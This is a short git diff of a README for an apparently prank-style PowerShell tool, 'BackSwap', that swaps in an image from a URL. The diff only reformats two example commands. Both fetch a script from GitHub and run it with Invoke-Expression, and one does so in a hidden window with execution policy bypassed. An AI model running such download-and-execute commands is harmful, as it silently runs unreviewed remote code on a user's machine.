@@ -18,7 +18,7 @@ Go to BS.ps1 and change the `"UR OWN IMAGE URL"`
 
 EXAMPLE
 
-IEX(IWR https://raw.githubusercontent.com/VBV11/BackSwap/main/BS.ps1)
+`IEX(IWR https://raw.githubusercontent.com/VBV11/BackSwap/main/BS.ps1)`
 
 ![image](https://github.com/VBV11/BackSwap/assets/104235290/013ead12-596d-47a9-8cec-05ba71834d2d)
 
@@ -31,7 +31,7 @@ IEX(IWR https://raw.githubusercontent.com/VBV11/BackSwap/main/BS.ps1)
 
 EXAMPLE
 
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/VBV11/BackSwap/main/BS.ps1?dl=1; invoke-expression $pl
+`powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/VBV11/BackSwap/main/BS.ps1?dl=1; invoke-expression $pl`
 
 ![image](https://github.com/VBV11/BackSwap/assets/104235290/e79c7083-6a1a-432f-aa79-9c666d991143)
 
